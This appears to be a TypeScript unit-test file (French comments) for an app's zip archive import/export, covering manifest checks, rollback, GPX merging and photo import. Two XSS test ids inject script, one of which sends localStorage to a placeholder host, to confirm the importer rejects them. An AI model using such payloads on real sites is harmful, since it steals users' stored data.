/**
 * pc-archive.test.ts — Tests unitaires de Archive (P2.CONV).
 *
 * Port TypeScript testé : src/apps/pctac/archive.ts (Archive: ArchiveContract),
 * port de modules/pctac/archive.js (GStart-main, 459 LOC).
 *
 * Contexte : indexedDB n'existe pas en jsdom (SPEC-PCTAC-CONVERSION.md §8.4) —
 * `@pctac/image-store.js` est mocké par un store en mémoire (`vi.mock`).
 * R2-T2a : `confirm()`/`alert()` natifs remplacés par `@shared/feedback.js`
 * (`confirmDialog`/`toast`) — module mocké (`confirmSpy`/`toastSpy`) plutôt
 * que `vi.stubGlobal('confirm'/'alert', ...)`.
 *
 * Couverture exigée par la mission P2.CONV :
 *  - manifest invalide (absent / mauvaise appName) ⇒ refus ET localStorage
 *    strictement inchangé (archive.js:129-147).
 *  - échec en cours d'import ⇒ rollback complet, localStorage ET images
 *    IndexedDB restaurés à l'identique (archive.js:160-232).
 *  - l'import accepte une image nommée .txt COMME .bin (archive.js:218).
 *  - passerelle OI : dédoublonnage par nom normalisé (existant + intra-batch,
 *    trigrammes) et repli sur le nom d'image non encodé (archive.js:369-370).
 */

import { beforeEach, describe, expect, it, vi } from 'vitest';
import JSZip from 'jszip';

import { ADVERSARIES_KEY, LOCAL_STORAGE_KEY, PHOTOS_KEY } from '@pctac/config.js';

// --- Mock ImageStore : indexedDB absent sous jsdom. Store en mémoire, avec un
// interrupteur `failClearOnce` pour simuler un échec ponctuel de clear() (test
// de rollback). `vi.hoisted` : la factory de vi.mock est hissée en tête de
// module, elle ne peut référencer que des valeurs elles-mêmes hissées.
const imageStoreState = vi.hoisted(() => ({
  store: new Map<string, string>(),
  failDeleteManyOnce: false,
  deleteThenFailOnce: false,
}));

const gpxState = new Map<string, unknown>();

vi.mock('@pctac/image-store.js', () => {
  const { store } = imageStoreState;
  return {
    // Magasin des traces GPX : l'archive l'utilise depuis l'ajout du dossier
    // `gpx/`. Sans lui, l'export et l'import jettent sur `undefined.get`.
    GpxStore: {
      async put(id: string, track: unknown): Promise<void> { if (id) gpxState.set(id, track); },
      async get(id: string): Promise<unknown> { return id && gpxState.has(id) ? gpxState.get(id) : null; },
      async delete(id: string): Promise<void> { gpxState.delete(id); },
      async clear(): Promise<void> { gpxState.clear(); },
    },
    ImageStore: {
      async put(id: string, dataUrl: string): Promise<void> {
        if (!id || !dataUrl) return;
        store.set(id, dataUrl);
      },
      async get(id: string): Promise<string | null> {
        if (!id) return null;
        return store.has(id) ? (store.get(id) ?? null) : null;
      },
      async getMany(ids: readonly string[]): Promise<Record<string, string | null>> {
        const out: Record<string, string | null> = {};
        ids.forEach((id) => { out[id] = store.has(id) ? (store.get(id) ?? null) : null; });
        return out;
      },
      async delete(id: string): Promise<void> {
        store.delete(id);
      },
      async deleteMany(ids: readonly string[]): Promise<void> {
        if (imageStoreState.failDeleteManyOnce) {
          imageStoreState.failDeleteManyOnce = false;
          throw new Error('IDB indisponible (simulation de test)');
        }
        if (imageStoreState.deleteThenFailOnce) {
          imageStoreState.deleteThenFailOnce = false;
          ids.forEach((id) => store.delete(id));
          throw new Error('IDB interrompue après effacement (simulation de test)');
        }
        ids.forEach((id) => store.delete(id));
      },
      async clear(): Promise<void> {
        store.clear();
      },
      async migrateFromLocalStorage(): Promise<void> {
        // no-op : non exercé par ces tests.
      },
      async hydrate<T extends { id: string }>(items: T[]): Promise<T[]> {
        return items;
      },
    },
  };
});

// R2-T2a : `confirmDialog`/`toast` mockés (remplacent `confirm()`/`alert()`
// natifs). `confirmSpy` retourne `true` par défaut (équivalent de l'ancien
// `vi.stubGlobal('confirm', vi.fn(() => true))`), surchargeable par test.
const confirmSpy = vi.hoisted(() => vi.fn(async () => true));
const toastSpy = vi.hoisted(() => vi.fn());
vi.mock('@shared/feedback.js', () => ({
  confirmDialog: confirmSpy,
  toast: toastSpy,
}));

// Rendu des annotations (canvas absent sous jsdom) : `<original>+<nombre>`.
const renderSpy = vi.hoisted(() => vi.fn(async (original: string, anns: unknown[]) => `${original}+${anns.length}`));
vi.mock('@pctac/photo-annotation.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('@pctac/photo-annotation.js')>()),
  renderAnnotated: renderSpy,
}));

// Imports APRÈS vi.mock (hissé de toute façon, mais garde l'ordre lisible).
import { findUnsafeId, Archive, mergeGpxIndex } from '@pctac/archive.js';
import { ImageStore } from '@pctac/image-store.js';
import { Storage } from '@pctac/storage.js';

/** Dump complet de localStorage (toutes clés), pour comparaison avant/après. */
function dumpLocalStorage(): Record<string, string> {
  const out: Record<string, string> = {};
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    if (k != null) out[k] = localStorage.getItem(k) ?? '';
  }
  return out;
}

interface PctacZipOptions {
  /** `undefined` = manifest PC TAC valide par défaut ; `null` = OMET manifest.json. */
  manifest?: Record<string, unknown> | null;
  data?: Record<string, string>;
  /** nom de fichier (sous `images/`) → contenu texte (dataURL brut, comme l'export). */
  images?: Record<string, string>;
  /** nom de fichier (sous `gpx/`) → contenu JSON de la trace. */
  gpx?: Record<string, string>;
}

/** Construit un `.pctac.zip` de test (même structure que Archive.exportZip). */
async function buildPctacZip(opts: PctacZipOptions = {}): Promise<File> {
  const zip = new JSZip();
  if (opts.manifest !== null) {
    const manifest = opts.manifest ?? { appName: 'PC TAC', version: 1, createdAt: new Date().toISOString() };
    zip.file('manifest.json', JSON.stringify(manifest));
  }
  zip.file('data.json', JSON.stringify(opts.data ?? {}));
  if (opts.images) {
    const folder = zip.folder('images');
    if (folder) {
      Object.entries(opts.images).forEach(([relName, content]) => {
        folder.file(relName, content);
      });
    }
  }
  if (opts.gpx) {
    const folder = zip.folder('gpx');
    if (folder) {
      Object.entries(opts.gpx).forEach(([relName, content]) => {
        folder.file(relName, content);
      });
    }
  }
  const buf = await zip.generateAsync({ type: 'arraybuffer' });
  return new File([buf], 'test.pctac.zip');
}

interface OiZipOptions {
  /** `undefined` = manifest OI valide par défaut ; `null` = OMET manifest.json. */
  manifest?: Record<string, unknown> | null;
  oiData: Record<string, unknown>;
  imagesMeta?: Record<string, string>;
  /** nom de fichier (sous `images/`) → contenu BASE64 des octets de l'image. */
  imageFiles?: Record<string, string>;
}

/** Construit un `.oi.zip` de test (data.json.tactical_oi_data = JSON.stringify(oiData)). */
async function buildOiZip(opts: OiZipOptions): Promise<File> {
  const zip = new JSZip();
  if (opts.manifest !== null) {
    const manifest = opts.manifest ?? { appName: 'OI' };
    zip.file('manifest.json', JSON.stringify(manifest));
  }
  zip.file('data.json', JSON.stringify({ tactical_oi_data: JSON.stringify(opts.oiData) }));
  if (opts.imagesMeta) zip.file('images.json', JSON.stringify(opts.imagesMeta));
  if (opts.imageFiles) {
    const folder = zip.folder('images');
    if (folder) {
      Object.entries(opts.imageFiles).forEach(([relName, content]) => {
        folder.file(relName, content, { base64: true });
      });
    }
  }
  const buf = await zip.generateAsync({ type: 'arraybuffer' });
  return new File([buf], 'test.oi.zip');
}

beforeEach(() => {
  localStorage.clear();
  imageStoreState.store.clear();
  imageStoreState.failDeleteManyOnce = false;
  imageStoreState.deleteThenFailOnce = false;
  confirmSpy.mockClear();
  confirmSpy.mockImplementation(async () => true);
  toastSpy.mockClear();
});

describe('Archive — window.Archive posé au scope module (archive.js:459)', () => {
  it('window.Archive est défini et référence la même instance', () => {
    expect((window as unknown as Record<string, unknown>).Archive).toBe(Archive);
  });
});

describe('importFile — validation du manifest AVANT toute modification (archive.js:129-147)', () => {
  it('refuse une archive sans manifest.json et ne modifie pas localStorage', async () => {
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify([{ id: '1', heure: '10:00', pax: 'X', paxMode: 'standard', lieu: '', remarques: '' }]));
    localStorage.setItem('pcTacPlanLocked', 'true');
    const before = dumpLocalStorage();

    const file = await buildPctacZip({ manifest: null, data: { [LOCAL_STORAGE_KEY]: JSON.stringify([{ id: 'x' }]) } });

    await expect(Archive.importFile(file)).rejects.toThrow(/manifest\.json/);
    expect(dumpLocalStorage()).toEqual(before);
  });

  it('refuse une archive dont le manifest appName n\'est pas "PC TAC" et ne modifie pas localStorage', async () => {
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify([{ id: '1' }]));
    const before = dumpLocalStorage();

    const file = await buildPctacZip({ manifest: { appName: 'OI' }, data: { [LOCAL_STORAGE_KEY]: JSON.stringify([{ id: 'y' }]) } });

    await expect(Archive.importFile(file)).rejects.toThrow(/OI/);
    expect(dumpLocalStorage()).toEqual(before);
  });

  it('revue (XSS) : archive portant un id hors format refusée avant toute modification', async () => {
    localStorage.setItem(ADVERSARIES_KEY, JSON.stringify([{ id: '1', nom: 'Terrain' }]));
    const before = dumpLocalStorage();
    const evil = "1');alert(1);('";
    const file = await buildPctacZip({ data: { [ADVERSARIES_KEY]: JSON.stringify([{ id: evil, nom: 'Piège' }]) } });
    await expect(Archive.importFile(file)).rejects.toThrow(/identifiant de fiche invalide/);
    expect(confirmSpy).not.toHaveBeenCalled();
    expect(dumpLocalStorage()).toEqual(before);
  });

  it('annule proprement si l\'utilisateur refuse la confirmation : aucune modification', async () => {
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify([{ id: '1' }]));
    const before = dumpLocalStorage();
    confirmSpy.mockImplementation(async () => false);

    const file = await buildPctacZip({ data: { [LOCAL_STORAGE_KEY]: JSON.stringify([{ id: 'z' }]) } });

    const result = await Archive.importFile(file);
    expect(result).toEqual({ ok: false, cancelled: true });
    expect(dumpLocalStorage()).toEqual(before);
  });
});

describe('importFile — double snapshot + rollback intégral sur échec (archive.js:160-232)', () => {
  it('restaure localStorage ET les images IndexedDB si le retrait des images échoue après l\'écriture localStorage', async () => {
    // État "terrain" avant import.
    // NB (D1-CLOISON) : l'import ne vide plus TOUT ImageStore — il ne retire
    // que les images référencées par la situation cible, les autres situations
    // partageant le même magasin. L'échec simulé porte donc sur `deleteMany`.
    Storage.saveCollection(ADVERSARIES_KEY, [{ id: 'a1', nom: 'Existant', hasImage: true }]);
    await ImageStore.put('a1', 'data:image/png;base64,AAA=');
    await ImageStore.put('a1_sync', 'data:image/png;base64,BBB=');
    const before = dumpLocalStorage();

    imageStoreState.failDeleteManyOnce = true;

    const file = await buildPctacZip({
      data: { [ADVERSARIES_KEY]: JSON.stringify([{ id: 'zzz', nom: 'Archive' }]) },
    });

    const result = await Archive.importFile(file);
    expect(result.ok).toBe(false);

    // localStorage restauré à l'identique (y compris ADVERSARIES_KEY écrasé
    // puis rollback).
    expect(dumpLocalStorage()).toEqual(before);
    // Images IndexedDB restaurées (double snapshot, archive.js:160-166).
    expect(await ImageStore.get('a1')).toBe('data:image/png;base64,AAA=');
    expect(await ImageStore.get('a1_sync')).toBe('data:image/png;base64,BBB=');
  });

  it('restaure localStorage si l\'écriture localStorage elle-même échoue (quota)', async () => {
    Storage.saveCollection(ADVERSARIES_KEY, [{ id: 'field1', nom: 'Original' }]);
    const before = dumpLocalStorage();

    const file = await buildPctacZip({
      data: { [ADVERSARIES_KEY]: JSON.stringify([{ id: 'from-archive' }]) },
    });

    const setItemSpy = vi.spyOn(localStorage, 'setItem').mockImplementationOnce(() => {
      throw new Error('QuotaExceededError (simulation)');
    });

    const result = await Archive.importFile(file);
    expect(result.ok).toBe(false);
    expect(dumpLocalStorage()).toEqual(before);

    setItemSpy.mockRestore();
  });
});

describe('importFile — accepte les images .txt ET .bin (archive.js:218)', () => {
  it('restaure une image nommée <id>.txt ET une nommée <id>.bin, extension retirée', async () => {
    const file = await buildPctacZip({
      images: {
        'idtxt.txt': 'data:image/png;base64,AAAA',
        'idbin.bin': 'data:image/png;base64,BBBB',
      },
    });

    const result = await Archive.importFile(file);
    expect(result).toMatchObject({ ok: true });

    expect(await ImageStore.get('idtxt')).toBe('data:image/png;base64,AAAA');
    expect(await ImageStore.get('idbin')).toBe('data:image/png;base64,BBBB');
  });
});

describe('importOiArchive — passerelle OI → PC-Tac (archive.js:279-456)', () => {
  it('dédoublonne les adversaires par nom normalisé (existant + intra-batch) et les trigrammes PATRACDVR', async () => {
    // Adversaire déjà saisi sur le terrain (accents/casse différents de l'OI).
    Storage.saveCollection(ADVERSARIES_KEY, [{ id: 'field1', nom: 'dupont', prenom: '' }]);

    const oiData = {
      adversaries: [
        { id: 'adv1', nom_adversaire: 'Dupont' }, // doublon avec l'existant (accents/casse)
        { id: 'adv2', nom_adversaire: 'Martin' },
        { id: 'adv3', nom_adversaire: 'Martin' }, // doublon intra-batch
      ],
      patracdvr_rows: [
        { members: [{ trigramme: 'ABC' }, { trigramme: 'N/A' }] },
      ],
      patracdvr_unassigned: [{ trigramme: 'abc' }], // doublon (casse) avec ABC
    };

    const file = await buildOiZip({ oiData });
    const result = await Archive.importOiArchive(file);

    expect(result.ok).toBe(true);
    expect(result.advAdded).toBe(1); // seul "Martin" est ajouté
    expect(result.advSkipped).toBe(2); // Dupont (déjà présent) + Martin (doublon intra-batch)
    expect(result.paxAdded).toBe(1); // ABC
    expect(result.paxSkipped).toBe(2); // N/A + abc (doublon de ABC)

    const finalAdv = Storage.loadCollection(ADVERSARIES_KEY);
    expect(finalAdv).toHaveLength(2);
  });

  it("reprend le carroyage de l'OI dans le plan de la situation courante, et l'affiche d'office", async () => {
    const grid = { west: 1.9, north: 47.9, cellM: 50, cols: 4, rows: 3, dLon: 0.00067, dLat: 0.00045 };
    const file = await buildOiZip({ oiData: { cartography: { grid } } });
    const result = await Archive.importOiArchive(file);

    expect(result.gridImported).toBe(true);
    expect(JSON.parse(localStorage.getItem('pcTacPlanGrid') ?? 'null')).toEqual(grid);
    expect(JSON.parse(localStorage.getItem('pcTacPlanOverlays') ?? '{}').gridOn).toBe(true);
  });

  it("carroyage OI corrompu : ignoré, jamais écrit", async () => {
    const file = await buildOiZip({ oiData: { adversaries: [{ id: 'a', nom_adversaire: 'X' }], cartography: { grid: { cols: 0 } } } });
    const result = await Archive.importOiArchive(file);
    expect(result.gridImported).toBe(false);
    expect(localStorage.getItem('pcTacPlanGrid')).toBeNull();
  });

  it('revue (XSS) : un identifiant hors format est repéré dans les collections de l’archive', () => {
    const evil = "1');fetch('//x/?'+JSON.stringify(localStorage));('";
    expect(findUnsafeId({ pcTacAdversaries: JSON.stringify([{ id: '1790231992926' }, { id: evil }]) })).toBe(evil);
    expect(findUnsafeId({ pcTacPhotos: JSON.stringify([{ id: 'oi_adv_k2_0_sync' }]), pcTacPlanPins: JSON.stringify([{ id: 'adv_a1_1790231992926' }]) })).toBeNull();
    // Clé hors collections ou valeur illisible : non concernée.
    expect(findUnsafeId({ theme: '"dark"', pcTacHostages: 'pas du json' })).toBeNull();
  });

  it('reprend domicile, profession, stature et ethnie (décision 20) ; rien de vide n’est posé', async () => {
    const file = await buildOiZip({ oiData: { adversaries: [
      { id: 'a', nom_adversaire: 'Leblanc', domicile_adversaire: '3 rue des Lilas', profession_adversaire: 'Chauffeur',
        stature_adversaire: '1m80, massif', ethnie_adversaire: 'Caucasien' },
      { id: 'b', nom_adversaire: 'Noir' },
    ] } });
    const result = await Archive.importOiArchive(file);
    expect(result.advAdded).toBe(2);
    const [a, b] = Storage.loadCollection(ADVERSARIES_KEY);
    expect(a).toMatchObject({ nom: 'Leblanc', domicile: '3 rue des Lilas', profession: 'Chauffeur', signalement: '1m80, massif, type Caucasien' });
    expect(b && 'signalement' in b).toBe(false);
    expect(b && 'domicile' in b).toBe(false);
  });

  describe('photo annotée dans l’OI (décision 26)', () => {
    const BOX = { id: 1, type: 'box', startX: 1, startY: 1, endX: 9, endY: 9, x: 1, y: 1, width: 8, height: 8, color: '#c0392b', thickness: 4, rotation: 0 };
    const ORIG = 'data:image/png;base64,' + Buffer.from('hello').toString('base64');
    const importWith = async (annotations: unknown): Promise<Record<string, unknown>> => {
      const file = await buildOiZip({
        oiData: { adversaries: [{ id: 'adv1', nom_adversaire: 'Annotée' }], dynamic_photos: { photo_main_adv1: [{ id: 'img1', annotations }] } },
        imagesMeta: { img1: 'image/png' },
        imageFiles: { 'img1.bin': Buffer.from('hello').toString('base64') },
      });
      const result = await Archive.importOiArchive(file);
      expect(result.advPhotos).toBe(1);
      return Storage.loadCollection(ADVERSARIES_KEY).find((a) => a.nom === 'Annotée')!;
    };

    beforeEach(() => { renderSpy.mockClear(); });

    it('arrive annotée partout, original et annotations gardés : modifiable dans le PC-Tac', async () => {
      const added = await importWith(JSON.stringify([BOX]));
      const id = String(added.id);
      expect(await ImageStore.get(id + '_orig')).toBe(ORIG);
      expect(await ImageStore.get(id)).toBe(ORIG + '+1');
      expect(await ImageStore.get(id + '_sync')).toBe(ORIG + '+1');
      expect(JSON.parse(String(added.annotations))).toEqual([BOX]);
    });

    it('annotations illisibles ou vides : la photo arrive telle quelle, sans original en double', async () => {
      for (const bad of ['pas du json', '{"a":1}', '[]', undefined]) {
        localStorage.clear();
        imageStoreState.store.clear();
        const added = await importWith(bad);
        const id = String(added.id);
        expect(await ImageStore.get(id)).toBe(ORIG);
        expect(await ImageStore.get(id + '_orig')).toBeNull();
        expect(added.annotations).toBeUndefined();
      }
      expect(renderSpy).not.toHaveBeenCalled();
    });

    it('rendu impossible : la photo arrive sans annotations, l’import continue', async () => {
      renderSpy.mockRejectedValueOnce(new Error('canvas'));
      const added = await importWith(JSON.stringify([BOX]));
      const id = String(added.id);
      expect(await ImageStore.get(id)).toBe(ORIG);
      expect(await ImageStore.get(id + '_orig')).toBeNull();
      expect(added.annotations).toBeUndefined();
    });
  });

  it('lit la photo via images/<encodeURIComponent(id)>.bin, avec repli sur le nom NON encodé', async () => {
    const oiData = {
      adversaries: [{ id: 'adv1', nom_adversaire: 'Sans Photo Encodee' }],
      dynamic_photos: { photo_main_adv1: [{ id: 'img 1' }] }, // id avec espace → nécessite encodage
    };

    const file = await buildOiZip({
      oiData,
      imagesMeta: { 'img 1': 'image/png' },
      // Stocké SOUS LE NOM NON ENCODÉ : 'images/img 1.bin' (pas 'images/img%201.bin').
      imageFiles: { 'img 1.bin': Buffer.from('hello').toString('base64') },
    });

    const result = await Archive.importOiArchive(file);
    expect(result.ok).toBe(true);
    expect(result.advPhotos).toBe(1);

    const advList = Storage.loadCollection(ADVERSARIES_KEY);
    const added = advList.find((a) => a.nom === 'Sans Photo Encodee');
    expect(added).toBeDefined();
    if (!added) return;
    expect(added.hasImage).toBe(true);
    expect(await ImageStore.get(added.id)).toBe('data:image/png;base64,' + Buffer.from('hello').toString('base64'));
  });
});

// ============================================================================
// Traces GPX dans l'archive — FUSION, jamais de remplacement.
// ============================================================================

describe('mergeGpxIndex — fusion de l\'index des traces', () => {
  const local = JSON.stringify([{ id: 'a', name: 'Locale' }]);

  it("archive ANCIENNE, sans traces : l'index local est rendu intact", () => {
    // C'est le cas le plus important : une archive d'avant cette
    // fonctionnalité ne doit pas faire disparaître les traces de l'opérateur.
    expect(mergeGpxIndex(local, undefined)).toBe(local);
    expect(mergeGpxIndex(local, '[]')).toBe(local);
  });

  it('archive avec des traces : les deux ensembles coexistent', () => {
    const merged = JSON.parse(mergeGpxIndex(local, JSON.stringify([{ id: 'b', name: 'Archive' }])) ?? '[]') as Array<{ id: string }>;
    expect(merged.map((t) => t.id).sort()).toEqual(['a', 'b']);
  });

  it("à id égal, l'entrée de l'archive gagne (ses coordonnées viennent d'être réécrites)", () => {
    const merged = JSON.parse(mergeGpxIndex(local, JSON.stringify([{ id: 'a', name: 'Archive' }])) ?? '[]') as Array<{ name: string }>;
    expect(merged).toHaveLength(1);
    expect(merged[0]?.name).toBe('Archive');
  });

  it('index illisible d\'un côté ou de l\'autre : ne jette jamais', () => {
    expect(() => mergeGpxIndex('pas du json', 'non plus')).not.toThrow();
    expect(mergeGpxIndex(null, undefined)).toBeNull();
    // Un index d'archive illisible équivaut à pas d'index : le local survit.
    expect(mergeGpxIndex(local, '{ pas un tableau }')).toBe(local);
  });
});

describe('importFile — traces GPX', () => {
  it('restaure les coordonnées du dossier gpx/ et fusionne l\'index', async () => {
    localStorage.setItem('pcTacGpxIndex', JSON.stringify([{ id: 'locale', name: 'Déjà là', color: '#fff', visible: true }]));
    gpxState.set('locale', { coords: [[[1, 1], [2, 2]]], times: null });

    const file = await buildPctacZip({
      data: { pcTacGpxIndex: JSON.stringify([{ id: 'archivee', name: 'Depuis archive', color: '#000', visible: true }]) },
      gpx: { 'archivee.json': JSON.stringify({ coords: [[[3, 3], [4, 4]]], times: [[1000, 2000]] }) },
    });

    const result = await Archive.importFile(file);
    expect(result).toMatchObject({ ok: true });

    // Les coordonnées de l'archive sont arrivées…
    expect(gpxState.get('archivee')).toEqual({ coords: [[[3, 3], [4, 4]]], times: [[1000, 2000]] });
    // …et la trace locale n'a PAS été effacée, contrairement aux images.
    expect(gpxState.get('locale')).toEqual({ coords: [[[1, 1], [2, 2]]], times: null });

    const index = JSON.parse(localStorage.getItem('pcTacGpxIndex') ?? '[]') as Array<{ id: string }>;
    expect(index.map((t) => t.id).sort()).toEqual(['archivee', 'locale']);
  });

  it("archive ANCIENNE, sans dossier gpx : les traces locales survivent", async () => {
    localStorage.setItem('pcTacGpxIndex', JSON.stringify([{ id: 'locale', name: 'Déjà là', color: '#fff', visible: true }]));
    gpxState.set('locale', { coords: [[[1, 1], [2, 2]]], times: null });

    const result = await Archive.importFile(await buildPctacZip({ data: {} }));
    expect(result).toMatchObject({ ok: true });

    expect(gpxState.get('locale')).toEqual({ coords: [[[1, 1], [2, 2]]], times: null });
    const index = JSON.parse(localStorage.getItem('pcTacGpxIndex') ?? '[]') as Array<{ id: string }>;
    expect(index.map((t) => t.id)).toEqual(['locale']);
  });

  it("une trace illisible dans le zip n'annule pas l'import du reste", async () => {
    const file = await buildPctacZip({
      data: { pcTacGpxIndex: JSON.stringify([{ id: 'bonne', name: 'B', color: '#000', visible: true }]) },
      gpx: { 'bonne.json': JSON.stringify({ coords: [[[3, 3], [4, 4]]], times: null }), 'cassee.json': 'pas du json' },
    });

    const result = await Archive.importFile(file);
    expect(result).toMatchObject({ ok: true });
    expect(gpxState.get('bonne')).toBeDefined();
    expect(gpxState.has('cassee')).toBe(false);
  });
});

describe('photos annotées (décision 25) : l’original `<base>_orig` voyage avec la photo', () => {
  it('export : l’original d’une photo de fiche et d’une photo de galerie est dans l’archive', async () => {
    Storage.saveCollection(ADVERSARIES_KEY, [{ id: 'a1', nom: 'X', hasImage: true, annotations: '[]' }]);
    Storage.saveCollection(PHOTOS_KEY, [{ id: 'p1', title: 'Porte', category: 'other', hasImage: true, annotations: '[]' }]);
    for (const id of ['a1', 'a1_sync', 'a1_orig', 'p1', 'p1_orig']) await ImageStore.put(id, `data:image/png;base64,${id}`);
    let exported: Blob | null = null;
    const create = vi.spyOn(URL, 'createObjectURL').mockImplementation((b) => { exported = b as Blob; return 'blob:x'; });
    vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    await Archive.exportZip();
    create.mockRestore();
    const zip = await JSZip.loadAsync(exported as unknown as Blob);
    const names = Object.keys(zip.files).filter((n) => n.startsWith('images/'));
    expect(names).toEqual(expect.arrayContaining(['images/a1_orig.txt', 'images/p1_orig.txt']));
  });

  it('import en remplacement : les originaux de la situation remplacée sont retirés', async () => {
    Storage.saveCollection(ADVERSARIES_KEY, [{ id: 'a1', nom: 'Existant', hasImage: true }]);
    Storage.saveCollection(PHOTOS_KEY, [{ id: 'p1', title: 'Porte', category: 'other', hasImage: true }]);
    for (const id of ['a1', 'a1_sync', 'a1_orig', 'p1', 'p1_orig']) await ImageStore.put(id, 'data:image/png;base64,AAA=');
    const file = await buildPctacZip({ data: { [ADVERSARIES_KEY]: JSON.stringify([{ id: 'zzz', nom: 'Archive' }]) } });
    const result = await Archive.importFile(file);
    expect(result.ok).toBe(true);
    expect(await ImageStore.get('a1_orig')).toBeNull();
    expect(await ImageStore.get('p1_orig')).toBeNull();
  });

  it('import raté : l’original est restauré avec la photo', async () => {
    Storage.saveCollection(ADVERSARIES_KEY, [{ id: 'a1', nom: 'Existant', hasImage: true }]);
    await ImageStore.put('a1', 'data:image/png;base64,AAA=');
    await ImageStore.put('a1_orig', 'data:image/png;base64,ORIG=');
    imageStoreState.deleteThenFailOnce = true;
    const file = await buildPctacZip({ data: { [ADVERSARIES_KEY]: JSON.stringify([{ id: 'zzz', nom: 'Archive' }]) } });
    expect((await Archive.importFile(file)).ok).toBe(false);
    expect(await ImageStore.get('a1_orig')).toBe('data:image/png;base64,ORIG=');
  });
});

describe('exportZip — retour boolean (décision 32)', () => {
  it('rend true quand le téléchargement est déclenché', async () => {
    vi.spyOn(URL, 'createObjectURL').mockReturnValue('blob:x');
    vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    await expect(Archive.exportZip()).resolves.toBe(true);
  });

  it('rend false quand la génération échoue, et garde le toast d’erreur', async () => {
    const spy = vi.spyOn(JSZip.prototype, 'generateAsync').mockRejectedValueOnce(new Error('boom'));
    try {
      await expect(Archive.exportZip()).resolves.toBe(false);
    } finally {
      spy.mockRestore();
    }
    expect(toastSpy).toHaveBeenCalled();
  });
});

